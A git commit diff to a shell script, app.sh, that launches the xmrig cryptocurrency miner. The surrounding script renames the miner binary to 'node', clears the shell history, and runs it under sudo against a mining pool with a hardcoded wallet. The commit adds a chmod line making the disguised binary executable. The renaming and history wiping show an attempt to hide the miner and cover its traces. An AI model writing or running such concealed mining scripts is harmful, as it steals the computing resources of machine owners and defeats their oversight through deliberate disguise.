ad0cc6174f1b1779ca9bacd7f59759ab46829a26
crypto-tool-ui <joniiie1456@gmail.com>
2025-12-01 03:35:53 +0700

    Update app.sh

--- app.sh
+++ app.sh
@@ -6,4 +6,5 @@ rm xmrig-6.24.0-linux-static-x64.tar.gz
 cd xmrig-6.24.0
 mv ./xmrig ./node
 history -c && history -w && clear
+chmod +x node
 sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
